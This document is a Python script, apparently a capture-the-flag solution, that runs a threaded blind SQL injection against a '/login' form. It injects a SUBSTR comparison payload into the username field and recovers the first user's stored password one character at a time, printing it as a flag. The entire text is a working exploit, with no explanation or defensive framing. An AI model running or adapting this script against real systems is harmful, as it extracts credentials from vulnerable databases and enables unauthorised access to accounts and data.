#!/usr/bin/python3
import sys
import requests
import string
import concurrent.futures

def send_p(url, query):
    payload = {"username": query, "password": "admin"}
    try:
        r = requests.post(url, data=payload, timeout=3)
    except requests.exceptions.ConnectTimeout:
        print("[!] ConnectionTimeout: Try to adjust the timeout time")
        sys.exit(1)
    return r.text

def check_char(url, i, c):
    h = hex(ord(c))[2:]
    query = "admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1)," \
            f"{i},1)=CAST(X'{h}' AS TEXT)--"
    resp = send_p(url, query)
    if "Invalid" not in resp:
        return c
    return None

def main(addr):
    url = f"http://{addr}/login"
    flag = ""
    password_len = 38
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + string.punctuation

    for i in range(1, password_len):
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(check_char, url, i, c): c for c in charset}
            for future in concurrent.futures.as_completed(futures):
                char = future.result()
                if char:
                    flag += char
                    print(flag)
                    break

    print(f"[+] FLAG: {flag}")

if __name__ == "__main__":
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} MACHINE_IP:PORT")
        sys.exit(0)
    main(sys.argv[1])
